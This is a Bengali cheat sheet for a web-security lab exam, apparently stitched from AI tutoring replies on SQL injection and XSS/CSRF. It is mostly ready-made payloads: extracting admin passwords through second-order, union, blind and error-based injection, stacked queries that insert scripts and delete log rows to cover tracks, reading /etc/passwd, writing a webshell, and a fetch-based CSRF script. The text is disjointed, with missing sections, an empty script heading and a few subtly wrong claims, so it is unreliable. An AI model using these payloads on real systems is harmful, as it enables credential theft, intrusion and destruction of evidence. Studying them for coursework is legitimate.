🧩 ক্যাটাগরি ৬: Second-Order SQL Injection
প্রবলেম: "রেজিস্ট্রেশনের পর প্রোফাইল ভিউতে ইনজেকশন"

ব্যাকগ্রাউন্ড:

    রেজিস্ট্রেশন ফর্মে ইউজারনেম ইনপুট নেওয়া হয়, এবং তা ডাটাবেসে সেভ হয় (এখানে কোনো ইনজেকশন কাজ করে না)।

    পরে প্রোফাইল ভিউ পেজে ওই ইউজারনেমটি SQL কোয়েরিতে বসে (এখানে ইনজেকশন কাজ করে)।

টাস্ক: Second-Order SQL Injection দিয়ে অ্যাডমিন পাসওয়ার্ড বের করো।

ইনজেক্টেবল ফিল্ড: প্রোফাইল ভিউ পেজের username প্যারামিটার (যা ডাটাবেস থেকে আসে)

সমাধান:

ধাপ ১: রেজিস্ট্রেশনে এমন একটি ইউজারনেম তৈরি করো:

    admin' UNION SELECT password FROM users WHERE username='admin' -- -

ধাপ ২: এই ইউজারনেম ডাটাবেসে সেভ হবে।

ধাপ ৩: প্রোফাইল ভিউ পেজে গেলে, এই ইউজারনেমটি SQL কোয়েরিতে বসবে এবং অ্যাডমিনের পাসওয়ার্ড রিটার্ন করবে।

মনে রাখা জরুরি: Second-Order Injection-এ প্রথম ইনপুটে কিছু হয় না, কিন্তু সেভ করা ডাটা পরে অন্য কোথাও ব্যবহার করলে ইনজেকশন ট্রিগার হয়।



### ০. বেসিক ইনজেকশন রুলস (সবচেয়ে গুরুত্বপূর্ণ)
- **কমেন্ট আউট (বাকি কোয়েরি বাদ দিতে)**: `-- -` (ড্যাশের পর স্পেস দিতে হয়) অথবা `#`
- **স্ট্রিং ক্লোজ করা**: পাসওয়ার্ড/পিন ফিল্ডে `'` দিয়ে দিয়ে তারপর কমেন্ট করো।
- **শূন্য রেজাল্ট বানানো (Union-এর জন্য)**: 
  - `' AND 1=0 -- -` 
  - অথবা ইউজারনেম দিয়ে `-1` বা ইউজারনেম 'যা নেই' দিয়ে দাও।

| **ডাটা টাইপ সহ কলাম** | `' UNION SELECT 1, group_concat(column_name, ':', data_type), 3,4,5 FROM information_schema.columns WHERE table_name='fine_record' -- -` |

### ৩. JOIN (যোগ করা) - (A1-এর মতো SUM বের করতে)
যখন দুই টেবিলের ডাটা একসাথে আনতে হয় (যেমন `member` আর `fine_record`)।
| **টাইপ** | **সিনট্যাক্স** | **কখন ব্যবহার করবি?** |
| :--- | :--- | :--- |
| **LEFT JOIN** | `FROM member m LEFT JOIN fine_record f ON m.id = f.member_id` | **সবার** ডাটা আনতে (যাদের ফাইন ০ তারাও আসবে) |
| **INNER JOIN** | `FROM member m JOIN fine_record f ON m.id = f.member_id` | শুধু যাদের ম্যাচিং এন্ট্রি আছে তাদের জন্য |

### ৪. অ্যাগ্রিগেট ফাংশন (SUM, COUNT, AVG, MAX, MIN) + GROUP BY
এগুলো শুধু `SELECT`-এর ভিতরে ইউজ করবি, আর সাথে `GROUP BY` দিতে ভুলবি না।

| **ফাংশন** | **কাজ** | **উদাহরণ (SQLi পেলোড)** |
| :--- | :--- | :--- |
| **SUM()** | যোগফল বেরায় | `SUM(amount)` |
| **COUNT()** | সংখ্যা গণনা করে | `COUNT(*)` |
| **AVG()** | গড় বেরায় | `AVG(amount)` |
| **MAX() / MIN()** | সর্বোচ্চ/সর্বনিম্ন | `MAX(amount)` |
| **DISTINCT** | ডুপ্লিকেট বাদ দেয় | `COUNT(DISTINCT status)` |

**টেমপ্লেট (যাদের ফাইন ০ তাদের সহ):**
```sql
' UNION SELECT 1, group_concat(m.id, ':', IFNULL(SUM(f.amount), 0)), 3,4,5
FROM member m LEFT JOIN fine_record f ON m.id = f.member_id
GROUP BY m.id -- -
```

### ৫. সাবকোয়েরি (Subquery) - যেখানে JOIN না করেই ভ্যালু আনা যায়
যখন মেইন `SELECT`-এর ভিতরে আরেকটা `SELECT` বসাই।

| **টাইপ** | **উদাহরণ (ফাইন বের করা)** | **ব্যাসিক এক্সপ্লেইন** |
| :--- | :--- | :--- |
| **Scalar (একটা মান)** | `(SELECT SUM(amount) FROM fine_record WHERE member_id = m.id)` | প্রত্যেক মেম্বারের জন্য আলাদা করে যোগফল বেরায় |
| **Correlated (সংযুক্ত)** | উপরের উদাহরণ (ভিতরে `m.id` ব্যবহার করা হয়েছে) | মেইন টেবিলের প্রত্যেক রো-র জন্য আলাদা রান করে |

### ৬. স্ট্যাকড কোয়েরি (UPDATE / DELETE) - (XSS বসাতে ও লগ ডিলিট করতে)
MySQL-এ `;` (সেমিকোলন) দিয়ে আলাদা করে একাধিক কোয়েরি চালানো যায় (যদি `multipleStatements` চালু থাকে)।

| **কাজ** | **পেলোড ফরম্যাট (ইনজেক্টেবল ফিল্ডে দিবি)** |
| :--- | :--- |
| **ডাটা আপডেট (XSS বসানো)** | `পিন'; UPDATE member SET last_name = '<script>alert(1)</script>' WHERE id=7700001; -- -` |
| **লগ ডিলিট (কভার ট্র্যাক)** | `পিন'; DELETE FROM log WHERE submitted_id = 4100001; -- -` |
| **যেখানে শর্ত দরকার হয় সেখানে** | শেষে `WHERE` দিয়ে শুধু নিজের আইডি ডিলিট করবি, বাকিদের রাখবি। |

### ৭. হ্যান্ডি মাইএসকিউএল ফাংশন (যেগুলো না জানলে ইনজেকশন কঠিন)

| **ফাংশন** | **কাজ** | **SQLi-তে ব্যবহার** |
| :--- | :--- | :--- |
| **GROUP_CONCAT()** | একাধিক রোকে কমা দিয়ে জোড়া লাগায় | সব ডাটা এক লাইনে এনে পেজে দেখানো |
| **IFNULL() / COALESCE()** | NULL থাকলে ০ বা অন্য মান বসায় | `IFNULL(SUM(amount), 0)` (যাদের ফাইন নেই তারা ০ দেখাবে) |
| **CASE WHEN** | শর্তানুসারে মান বেছে নেয় | `SUM(CASE WHEN status='UNPAID' THEN amount ELSE 0 END)` |
| **SUBSTRING() / MID()** | স্ট্রিংয়ের নির্দিষ্ট অংশ কাটে | Blind Injection-এ অক্ষর বের করতে |
| **ASCII() / ORD()** | অক্ষরের ASCII মান বেরায় | Blind Injection-এ নাম্বার দিয়ে তুলনা করতে |
| **SLEEP()** | কত সেকেন্ড দেরি করবে | Time-based Blind Injection-এ |
| **LENGTH()** | স্ট্রিংয়ের দৈর্ঘ্য বেরায় | পাসওয়ার্ডের সাইজ বের করতে |
| **LOAD_FILE()** | সার্ভারের ফাইল পড়ে (যদি অনুমতি থাকে) | `/etc/passwd` পড়তে |
| **INTO OUTFILE** | ফাইল তৈরি করে (যদি অনুমতি থাকে) | ওয়েবশেল আপলোড করতে |

### ৮. XSS + CSRF পেলোড বানানোর টেমপ্লেট (সর্বশেষ স্টেপ)

**ফেচ রিকোয়েস্ট (সরাসরি স্ক্রিপ্ট পাঠালে):**

<script>

### ৯. ডাবল এনকোডিং (B1-এর রিফ্লেক্টেড XSS-এর জন্য)
যদি লিংক পোস্ট করতে হয় (যেমন `http://site/search?q=<script>`), তাহলে পুরো লিংকটাকে আবার এনকোড করো।
**JS কনসোলে করে ফেলো:**
```js
encodeURIComponent("http://site/search?q=" + encodeURIComponent("<script>alert(1)</script>"));
```
(আউটপুটে `%253Cscript%253E` এরকম আসবে, যা `message=`-এর ভ্যালু হিসেবে বসবে)।

### 🎯 পরীক্ষায় কনফিউশন দূর করার ম্যাজিক টিপস:

1. **কাজ করছে না কেন?** প্রথমে দেখো `' and '1'='1` (কাজ করে) বনাম `' and '1'='0` (কাজ করে না) কিনা। যদি এই দুইটার মধ্যে পার্থক্য হয়, বুঝবে ফিল্ড ইনজেক্টেবল।
2. **`GROUP BY` ভুলে গেলে?** শুধু `SUM()` দিলে কিন্তু `GROUP BY` না দিলে সব যোগ হয়ে যাবে। তাই `GROUP BY id` দিতে ভুলো না।
3. **NULL vs 0**: `LEFT JOIN`-এ `IFNULL` বা `COALESCE` ইউজ না করলে যাদের ডাটা নেই তারা খালি দেখাবে। পরীক্ষায় ০ দেখাতে চাইলে `IFNULL` দাও।
4. **সিঙ্গেল কোট (')**: সবসময় মনে রাখবে, SQL স্ট্রিংয়ের বাইরের অংশ সিঙ্গেল কোটে, আর JS-এর ভিতরে ডাবল কোট (`"`) ব্যবহার করো, অথবা `%27` এনকোডিং করো।

এই চিটশিটটা তোর `c1-try.txt` বা `a1-try.txt`-এর পাশে রেখে দে। ৪০ মিনিটের পরীক্ষায় এই কমান্ডগুলো হাতের কাছে থাকলেই তুই যেকোনো ভ্যারিয়েন্ট সামলে নিতে পারবি ইনশাআল্লাহ। 💪

দারুণ প্রশ্ন! **Second-Order SQL Injection** হলো SQL ইনজেকশনের সেই রূপ, যেটা পরীক্ষায় প্রায়ই আসে এবং অনেক শিক্ষার্থী ভুল বোঝে। কারণ এখানে প্রথম ইনপুটে কিছুই (চোখে) দেখা যায় না—আক্রমণ "ঘুমিয়ে" (Dormant) থাকে, পরে অন্য কোনো জায়গায় গিয়ে "জেগে" ওঠে।

আমি তোমাকে পুরো ব্যাপারটা Depth-এ, বাংলায়, এবং তোমার দেখা ল্যাবগুলোর সাথে মিলিয়ে বুঝাচ্ছি।

### ১. Second-Order SQL Injection কী? (সহজ সংজ্ঞা)

**সাধারণ SQL Injection (First-Order):** 
তুমি ইনপুট ফিল্ডে (`' OR 1=1 -- -`) টাইপ করলাম, আর সাথে সাথেই সার্ভার সেই ইনপুট নিয়ে SQL কোয়েরি করলো—এখনই ইনজেকশন এক্সিকিউট হলো।

**Second-Order SQL Injection:**
তুমি ইনপুট ফিল্ডে `' OR 1=1 -- -` টাইপ করলে, সার্ভার এটাকে **নিরাপদ ডাটা** হিসেবে ডাটাবেসে সেভ (INSERT/UPDATE) করে দেয়। কিন্তু! পরে আরেকটা ফিচার (যেমন অ্যাডমিন প্যানেল, প্রোফাইল ভিউ, রিপোর্ট জেনারেশন) যখন এই সেভ করা ডাটাটাকে পড়ে (SELECT) করে আবার নতুন কোনো SQL কোয়েরিতে বসায়, তখন সেই দ্বিতীয় কোয়েরিতে ইনজেকশন এক্সিকিউট হয়।

> **মনে রাখার সহজ উপায়:** 
> *First-Order* = খাওয়া মাত্রই বমি।
> *Second-Order* = খেয়ে হজম করে, ২ ঘন্টা পর পেটে গিয়ে বিষক্রিয়া (Toxin) তৈরি করে।

---

### ২. Second-Order কেন হয়? (প্রযুক্তিগত কারণ)

সাধারণত দুই কারণে হয়:
১. **১ম জায়গায় (INSERT/UPDATE) প্রিপেয়ার্ড স্টেটমেন্ট (Parameterized Query) ব্যবহার করা হয়**—তাই প্রথমবার ইনজেকশন কাজ করে না।
২. **কিন্তু ২য় জায়গায় (SELECT/UPDATE) ডাটাবেস থেকে আনা ডাটাকে সরাসরি SQL স্ট্রিংয়ে বসিয়ে দেওয়া হয়**, ডাটাবেস ভাবে "এটা তো ডাটা, ট্রাস্টেড", অথচ এটার ভিতরে আছে ম্যালিশিয়াস SQL ফ্র্যাগমেন্ট।

---

### ৩. ধাপে ধাপে একটি বাস্তব উদাহরণ (Exam Scenario)

ধরো, একটি লাইব্রেরি ম্যানেজমেন্ট সিস্টেম আছে। 

- **১ম পেজ (Registration/Update Profile):** তুমি তোমার `Full Name` আপডেট করতে পারো। 
- **২য় পেজ (Admin Report):** অ্যাডমিন "ব্যবহারকারীদের তালিকা" দেখলে, নামের পাশে তাদের ইস্যু করা বইয়ের সংখ্যা দেখায়। এই তালিকা বের করার জন্য `SELECT * FROM users WHERE name = 'এখানে_নাম_বসে'` কোয়েরি চলে।

**ধাপ ১ (Injection - Sleep State):**
তুমি প্রোফাইল আপডেট করতে গিয়ে `Full Name` ফিল্ডে লিখলে:
```
John Doe' OR '1'='1
```
লাইব্রেরি সিস্টেম প্রিপেয়ার্ড স্টেটমেন্ট ব্যবহার করায়, এই ডাটা নিরাপদে টেবিলে সেভ হয়ে গেল (ঠিক `John Doe' OR '1'='1` নামটা সেভ হলো)।

**ধাপ ২ (Trigger - Wake Up):**
কয়েকদিন পর অ্যাডমিন রিপোর্ট পেজে গেল। সেখানে প্রত্যেক ইউজারের নামের পাশে বইয়ের সংখ্যা দেখানোর জন্য কোডটা এমন লিখা (ভুলভাবে):
```sql
SELECT COUNT(*) FROM books WHERE issued_to = 'John Doe' OR '1'='1'
```
এখন ডাটাবেস এই কোয়েরি রান করলো। যেহেতু ইউজারের নামের ভিতরে `' OR '1'='1` আছে, কোয়েরিটি দাঁড়ালো:
```sql
SELECT COUNT(*) FROM books WHERE issued_to = 'John Doe' OR '1'='1'
```
এখন `'1'='1` সবসময় সত্য, তাই অ্যাডমিন দেখবে পুরো লাইব্রেরির সব বইয়ের সংখ্যা (সবার ইস্যু) এক ইউজারের নামের পাশে চলে আসছে! অথবা তুমি যদি ইউনিয়ন ইনজেকশন বসিয়ে দিতে, তাহলে অ্যাডমিনের পাসওয়ার্ডও চলে আসতে পারতো।

---

### ৪. A1, B1, C1-এর সাথে Second-Order-এর সম্পর্ক

তুমি মনে করো, A1-তে তুমি কি করেছিলে?
→ তুমি `last_name` আপডেট করে তাতে `<script>...</script>` বসিয়েছিলে। পরে যখন কেউ রেজাল্ট দেখতে গেল, তখন সেটা রেন্ডার হলো। **এটা কিন্তু First-Order XSS ছিল (কারণ ইনপুট দেয়ার সাথে সাথে রেন্ডার হয়েছিল)**।

**Second-Order SQL Injection-এ পার্থক্য কোথায়?**
- XSS-এ তুমি `fetch` দিয়ে JS চালিয়েছো। 
- Second-Order SQLi-তে তুমি `fetch` না, বরং **আরেকটা SQL কমান্ড** (যেমন `UNION SELECT password FROM admin`) বসাবে স্ট্রিংয়ের ভিতরে।
- কিন্তু প্রথমবার আপডেট করার সময় সেটা কাজ করবে না (কারণ প্রিপেয়ার্ড স্টেটমেন্ট আছে)।
- পরে যখন অন্য কোথাও ওই স্ট্রিংটা ব্যবহার করে Query বানানো হবে, তখন সেই SQL কমান্ডটি এক্সিকিউট হবে।

---

### ৫. পরীক্ষায় কিভাবে চিনবে এবং কী করবে?

**চিহ্নিত করার উপায় (How to spot):**
১. তুমি ইনপুট ফিল্ডে `' AND SLEEP(5) -- -` দিলে রেসপন্স তাৎক্ষণিক আসে (মানে ১ম কোয়েরি প্রিপেয়ার্ড)।
২. কিন্তু তুমি যদি দেখো, এই ইনপুটটা পরে অন্য পেজে (যেমন অ্যাডমিন প্যানেল বা রিপোর্ট) গিয়ে দেখা যাচ্ছে, এবং সেখানে কোনো প্যারামিটার নেই (শুধু URL-এ আইডি আছে), তাহলে সন্দেহ করবে—ওখানে হয়তো Second-Order আছে।

**সলভ করার কৌশল (Exam Strategy):**
১. ১ম পেজে (যেখানে আপডেট করা যায়) সেখানে **পেলোড** সেভ করো। পেলোড হতে পারে:
   ```sql
   ' UNION SELECT username, password FROM admins WHERE '1'='1 -- -
   ```
   (অথবা Blind-এর জন্য `' AND IF(1=1, SLEEP(5), 0) -- -`)

২. এরপর ২য় পেজে (যেখানে এই ডাটাটা রেন্ডার হয়) গিয়ে রিফ্রেশ দাও/ভিজিট করো। যদি সেখানে স্লো রেসপন্স আসে বা ইউনিয়নের ডাটা চলে আসে, বুঝবে Second-Order পেয়ে গেছো।

---

### ৬. Second-Order-এর সাথে সম্পর্কিত ৩টি গুরুত্বপূর্ণ টেকনিক (যা পরীক্ষায় আসতে পারে)

| **টেকনিক** | **কীভাবে কাজ করে?** | **উদাহরণ পেলোড** |
| :--- | :--- | :--- |
| **নেমড পাইপ (Named Pipe)** | ১ম ইনপুটে `' INTO OUTFILE '//attacker/share/foo'` দিয়ে ফাইল রাইট ট্রিগার করো। পরে সেটা রিড হয়। | `' INTO OUTFILE '/tmp/test.txt' -- -` |
| **ডাটা টাইপ কনভার্শন** | যদি ২য় কোয়েরিতে কাস্টিং (যেমন `CAST(name AS INT)`) হয়, তাহলে Error-based Second-Order হয়। | `' AND 1=CAST((SELECT password FROM admin) AS INT) -- -` |
| **Truncation Attack** | ১ম ইনপুটে এত বড় স্ট্রিং দাও যে ডাটাবেসের কলাম সাইজ কাটিং (Truncate) করে। পরে কাটা অংশটা ২য় কোয়েরিতে যায়। | `' UNION SELECT ... -- -` (অনেক স্পেস দিয়ে) |

---

### ৭. বাস্তব কোড উদাহরণ (Conceptual PHP - যাতে ক্লিয়ার হয়)

```php
// ===== ১ম ফাইল: update_profile.php (এখানে প্রিপেয়ার্ড ব্যবহার করায় ইনজেকশন হয় না) =====
$name = $_POST['full_name'];
$stmt = $conn->prepare("UPDATE users SET full_name = ? WHERE id = ?");
$stmt->bind_param("si", $name, $user_id);
$stmt->execute(); // নিরাপদে সেভ হলো

// ===== ২য় ফাইল: admin_report.php (এখানে সরাসরি স্ট্রিং বসানো হয়েছে) =====
$user_name = $row['full_name']; // ডাটাবেস থেকে আনা নাম (যেমন John Doe' OR '1'='1)
$query = "SELECT COUNT(*) FROM books WHERE issued_to = '$user_name'";
$result = $conn->query($query); // 🔥 এখানে ইনজেকশন এক্সিকিউট হলো!
```

### 🎯 তোমার জন্য প্র্যাকটিস চ্যালেঞ্জ (Second-Order)

> **Scenario:** একটি ফোরাম সাইটে ইউজার "About Me" সেকশনে টেক্সট আপডেট করতে পারে। প্রশাসক যখন "User Details" পেজে ক্লিক করেন, তখন ওই About Me-টেক্সটটি `WHERE bio = '...'` কোয়েরিতে বসে একটি সার্চ করে।
> 
> **তোমার টাস্ক:** এমন একটি পেলোড লিখো যা About Me-তে সেভ করলে, অ্যাডমিন যখন ওই পেজে যান, তখন ডাটাবেসের `admin_passwords` টেবিল থেকে সব পাসওয়ার্ড বের করে ফেলে।

**উত্তর (চেষ্টা করো, তারপর দেখো):**
> ১ম ইনপুটে (About Me) সেভ করো: `' UNION SELECT password FROM admin_passwords WHERE '1'='1 -- -`
> অ্যাডমিন যখন ইউজার ডিটেইলস পেজে যান, সেখানে `WHERE bio = '' UNION SELECT password FROM admin_passwords WHERE '1'='1 -- -` রান হবে এবং পাসওয়ার্ডগুলো তার স্ক্রিনে চলে আসবে (যদি আউটপুট কলাম মিলে) অথবা Time-based Blind ট্রিগার করবে।

### 💥 শেষ কথা

দেখো, তোমার করা XSS আর CSRF যেখানে **ক্লায়েন্ট-সাইড (ব্রাউজার)**-এ এক্সিকিউট হয়, Second-Order SQL Injection **সার্ভার-সাইড (ডাটাবেস)**-এ এক্সিকিউট হয়। লজিকটা একই: "এখন কাজ না করলেও, পরে কাজ করবে।"

পরীক্ষায় যদি এমন প্রশ্ন আসে, তাহলে তুমি সেটা চিনতে পারবে যদি দেখো **ডাটা সেভ করার জায়গায় ইনজেকশন কাজ করছে না**, কিন্তু **সেই ডাটা ডিসপ্লে/প্রসেস করার জায়গায় ইনজেকশনের প্রভাব পড়ছে**। তখন তুমি জানবে—এটা Second-Order!

এখন তুমি কি আরেকটা উদাহরণ চাও, নাকি এই কনসেপ্ট নিয়ে কোনো কনফিউশন আছে?


খুব সুন্দর প্রশ্ন! তুমি `IFNULL()` বা `COALESCE()` এর কাজ বুঝতে পেরেছ, এখন দেখতে চাচ্ছো **আরও কী কী ফাংশন আছে যা SQL ইনজেকশনে কাজে লাগাতে পারো**। 

তোমার দেওয়া কোয়েরি ছিল ভারী সুন্দর—শুধু `IFNULL` ব্যবহার করেই তুমি NULL সমস্যা সমাধান করেছো। কিন্তু পরীক্ষায় নতুন চ্যালেঞ্জ আসতে পারে, যেমন "NULL দেখাতে হবে" বা "খালি জায়গায় ০-এর বদলে 'N/A' দেখাতে হবে"।

MySQL-এ **৪ ধরনের ফাংশন** আছে যা তোমার মতো কোয়েরিতে (এবং Blind Injection-এ) খুব কাজে দেয়। নিচে ক্যাটাগরি অনুযায়ী তুলে দিচ্ছি:

---

### ১. নাল হ্যান্ডলিং ফাংশন (তুমি যেটা ব্যবহার করেছো)
এগুলো `NULL` থাকলে ডিফল্ট কোনো মান বসায়।

| **ফাংশন** | **কাজ** | **তোমার কোয়েরিতে ব্যবহার** | **কখন কাজে লাগবে?** |
| :--- | :--- | :--- | :--- |
| `IFNULL(expr1, expr2)` | expr1 যদি NULL হয়, তাহলে expr2 দেখাবে। | `IFNULL(SUM(amount), 0)` | সবচেয়ে সোজা, ০ দেখাতে। |
| `COALESCE(expr1, expr2, ...)` | অনেকগুলোর মধ্যে প্রথম NOT NULL টি দেখায়। | `COALESCE(SUM(amount), 0, 'N/A')` | একাধিক ফলব্যাক মান দিতে। |
| `NULLIF(expr1, expr2)` | expr1 আর expr2 সমান হলে NULL করে দেয়। | `NULLIF(amount, 0)` (যদি ০ হয়, তাহলে NULL বানায়) | ০-কে NULL বানাতে চাইলে (উল্টো কাজ) |

---

### ২. কন্ডিশনাল লজিক ফাংশন (Blind Injection ও ক্যালকুলেশনে লাগে)
`CASE WHEN` তো জানোই। এর বাইরে শর্টকাট ফাংশন আছে:

| **ফাংশন** | **কাজ** | **SQLi-তে কিভাবে বসাবি?** |
| :--- | :--- | :--- |
| `IF(condition, true_val, false_val)` | কন্ডিশন True হলে ১ম মান, False হলে ২য় মান দেখায়। | `IF(1=1, 'Yes', 'No')` → `Yes` দেখায়। Blind Injection-এ টাইম বের করার জন্য: <br> `IF(SUBSTRING(password,1,1)='a', SLEEP(5), 0)` |
| `CASE WHEN ... THEN ... ELSE ... END` | (তুমি ইতিমধ্যে ব্যবহার করেছো) | `SUM(CASE WHEN status='UNPAID' THEN amount ELSE 0 END)` |

---

### ৩. ডাটা টাইপ কনভার্শন ফাংশন (Error-based Injection-এর জন্য গেম চেইঞ্জার)
যদি Union কাজ না করে, তখন ইচ্ছাকৃত Error করিয়ে ডাটা বের করো।

| **ফাংশন** | **কাজ** | **SQLi পেলোড উদাহরণ** |
| :--- | :--- | :--- |
| `CAST(expr AS type)` | এক টাইপ থেকে আরেক টাইপে কনভার্ট করে। | `CAST((SELECT password FROM users) AS INT)` — যদি পাসওয়ার্ড স্ট্রিং হয়, INT-এ কনভার্ট করতে গিয়ে Error ছুড়বে, আর Error মেসেজের ভিতর পাসওয়ার্ড চলে আসবে! |
| `CONVERT(expr, type)` | `CAST`-এর মতোই। | `CONVERT((SELECT database()), CHAR)` |

### ৪. স্ট্রিং ফরম্যাটিং ফাংশন (আউটপুট সুন্দর করতে)
তুমি `GROUP_CONCAT` তো ব্যবহার করোই। কিন্তু `CONCAT`-এর বাইরেও কিছু দারুণ ফাংশন আছে:

| **ফাংশন** | **কাজ** | **তোমার কোয়েরিতে ব্যবহার** |
| :--- | :--- | :--- |
| `CONCAT_WS(separator, str1, str2, ...)` | "With Separator" - প্রথমটা সেপারেটর, বাকিগুলো জোড়া দেয়। | `CONCAT_WS(' : ', member_id, first_name, last_name)` → `3005001 : Liam : Smith` এরকম বানায়। `NULL` থাকলেও সেটা স্কিপ করে, Error দেয় না। |
| `FORMAT(number, decimals)` | নাম্বারকে কমা দিয়ে ফরম্যাট করে। | `FORMAT(amount, 2)` → `1,240.75` দেখায়। |
| `LPAD()` / `RPAD()` | বামে/ডানে ক্যারেক্টার যোগ করে। | Blind Injection-এ পাসওয়ার্ডের লেংথ বুঝতে। |

### ৫. এনভায়রনমেন্ট ফাংশন (সার্ভার সম্পর্কে জানতে)
তুমি হয়তো `database()` ব্যবহার করো। কিন্তু আরও কিছু আছে:

| **ফাংশন** | **কাজ** | **SQLi-তে বসাও** |
| :--- | :--- | :--- |
| `USER()` / `CURRENT_USER()` | কোন ইউজার দিয়ে কুয়েরি চালাচ্ছে। | `' UNION SELECT 1, USER(), 3 -- -` |
| `VERSION()` | MySQL ভার্সন জানায়। | `' UNION SELECT 1, VERSION(), 3 -- -` (উপকারী, কারণ ৮.০ আর ৫.৭-এর সিনট্যাক্সে পার্থক্য আছে) |
| `@@hostname` | সার্ভারের হোস্টনেম। | `' UNION SELECT 1, @@hostname, 3 -- -` |

### 📊 তোমার কোয়েরিতে কখন কোনটা বসাবে? (শুধু IFNULL না)

তুমি যে কোয়েরিটি করেছো:
```sql
IFNULL((select sum(amount) ...), 0)
```
এটার **আল্টারনেটিভ** হিসেবে নিচের ৩টার যেকোনো একটা বসাতে পারো, সবই একই কাজ করবে:

1. **`COALESCE((select sum(amount) ...), 0)`** → (যদি একাধিক ফলব্যাক দিতে চাও, যেমন প্রথমে যোগফল, তা না হলে ০, তা না হলে 'N/A')।
2. **`IF((select sum(amount) ...) IS NULL, 0, (select sum(amount) ...))`** → (কিন্তু এতে কোয়েরি ২ বার রান হয়, ধীরগতির)।
3. **`CASE WHEN (select sum(amount) ...) IS NULL THEN 0 ELSE (select sum(amount) ...) END`** → (একই কাজ, কিন্তু বড় কোয়রি)।

👉 **পরীক্ষায় বেস্ট চয়েস:** `IFNULL` (সবচেয়ে ছোট, দ্রুত, এবং MySQL-এ এক্সক্লুসিভ) অথবা `COALESCE` (সব ডাটাবেসে চলে, স্ট্যান্ডার্ড)।

### 🔥 ২টি ফাংশন যা পরীক্ষায় **অবশ্যই** কাজে লাগবে (IFNULL ছাড়া)

1. **`IF()`** (Blind Injection-এর জন্য): 
   ধরো, পেজে কোনো ডাটা দেখায় না। তুমি লিখবে:
   ```sql
   ' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0) -- -
   ```
   (এটা ৫ সেকেন্ড দেরি করলে বুঝবে ১ম অক্ষর 'a' )।

2. **`CAST()`** (Error-based Injection-এর জন্য):
   ধরো, Union কাজ করছে না। তুমি লিখবে:
   ```sql
   ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT) -- -
   ```
   (এটা Error মেসেজে পুরো পাসওয়ার্ড চিৎকার করে বলে দেবে)।

### 📝 সারসংক্ষেপ (পরীক্ষায় কোনটা কোথায় বসাবে?)

| **প্রয়োজন** | **ব্যবহার করো** | **উদাহরণ** |
| :--- | :--- | :--- |
| NULL → ০ বানাতে | `IFNULL()` বা `COALESCE()` | `IFNULL(SUM(amount), 0)` |
| শর্ত অনুযায়ী মান বেছে নিতে | `IF()` বা `CASE` | `IF(1=1, 'A', 'B')` |
| ডাটা টাইপ Error খাওয়াতে | `CAST()` | `CAST(password AS INT)` |
| নাম্বার ফরম্যাট করতে | `FORMAT()` | `FORMAT(amount, 2)` |
| স্ট্রিং জোড়া দিতে (NULL স্কিপ) | `CONCAT_WS()` | `CONCAT_WS(' ', fname, lname)` |
| Time Delay দিতে | `SLEEP()` | `SLEEP(5)` |

এই ফাংশনগুলোর নাম আর কাজটা মনে রাখলেই তুমি যেকোনো অজানা ডাটাবেসে গিয়ে নিজের মতো করে ডাটা বের করে ফেলতে পারবে। তুমি ইতিমধ্যে A1, B1, C1 করে ফেলেছো—এবার এই ফাংশনগুলো হাতে কলমে A1-তে বসিয়ে দেখো (যেমন `COALESCE` দিয়ে আগের কোয়েরি রিপ্লেস করে দেখো)। ইনশাআল্লাহ আরও কনফিডেন্ট লাগবে! 💪

তুমি `document.title` ব্যবহার করে অভ্যস্ত হয়ে গেছো—এটা খুব ভালো। কিন্তু পরীক্ষায় বা ল্যাবে কখনো কখনো **`document.title` কাজ করে না** (যদি পেজে `<title>` ট্যাগ না থাকে, বা সেটা যদি JavaScript-এর মাধ্যমে আগেই চেইঞ্জ হয়)। তাই বিকল্প (Alternatives) জানা থাকা দরকার।

তুমি যে ফাইলটা দিয়েছো, সেটা হলো XSS পেলোডের জন্য **Visual Proof (চোখে দেখা প্রমাণ)**-এর একটি চমৎকার সংগ্রহ। নিচে প্রতিটি ফাংশনকে ক্যাটাগরি অনুযায়ী সাজিয়ে, পরীক্ষায় কোনটা কখন কাজে লাগবে—সেটা বুঝিয়ে দিচ্ছি।

### 🎯 ক্যাটাগরি ১: পেজের কন্টেন্ট পরিবর্তন করা (Text/DOM Manipulation)
এই গুলো তুমি ইউজ করবে যখন **টাইটেল চেইঞ্জ হয় না** বা তুমি চাও পেজের মাঝখানে বড় করে লেখা দেখাক।

| **ফাংশন** | **কী করে?** | **কখন ব্যবহার করবি?** |
| :--- | :--- | :--- |
| `document.body.insertAdjacentText("afterbegin","HACKED")` | পেজের একদম উপরের দিকে (শুরুর দিকে) "HACKED" টেক্সট যোগ করে দেয়। | যেকোনো পেজে কাজ করে (কারণ `<body>` সব পেজেই থাকে)। |
| `document.querySelector("h1").textContent="HACKED"` | পেজের প্রথম `<h1>` ট্যাগের লেখা বদলে দেয়। | যদি পেজে হেডিং থাকে (যেমন "Welcome" বা "Dashboard")। |
| `document.body.innerHTML = "HACKED"` | **সতর্কতা:** পুরো পেজের কন্টেন্ট মুছে শুধু "HACKED" বসায়। | (ল্যাবে কম ইউজ করো, কারণ পুরো পেজ ভেঙে যায়, কিন্তু খুব দ্রুত প্রমাণ চাইলে কাজ করে) |
| `document.write("HACKED")` | পেজ লোড হওয়ার সময় যদি রান করে, তাহলে পুরো পেজের জায়গায় লেখা বসায়। | (অধিকাংশ আধুনিক ব্রাউজারে ব্লক, তাই এড়িয়ে চলো) |

### 💥 সবচেয়ে গুরুত্বপূর্ণ কথা (পরীক্ষার জন্য)

> **মনে রাখবে:** তুমি শুধু "পেজ নষ্ট করো" বা "অ্যালার্ট দাও" এর জন্য এই ফাংশনগুলো ব্যবহার করছো না। এগুলো শুধু **প্রমাণ (Proof of Concept)**। 
> আসল কাজটা (CSRF) কিন্তু `fetch()` দিয়ে করছো। তাই পেলোড বানানোর সময় খেয়াল রাখবে:
> 1. যেন `fetch()`-এর আগে বা পরে পেজ ক্র্যাশ না করে।
> 2. যেন `<script>` ট্যাগের ভিতরে সঠিক সিনট্যাক্স থাকে (সেমিকোলন `;` ব্যবহার করো)।
> 
> **নিখুঁত কম্বো পেলোড (Title + Fetch একসাথে):**
> ```html
> <script>
> document.title="HACKED";
> fetch("http://localhost:4001/list", {
>     method: "POST",
>     credentials: "include",
>     headers: {"Content-Type": "application/x-www-form-urlencoded"},
>     body: "title=Hacked&price=100"
> });
> </script>
> ```
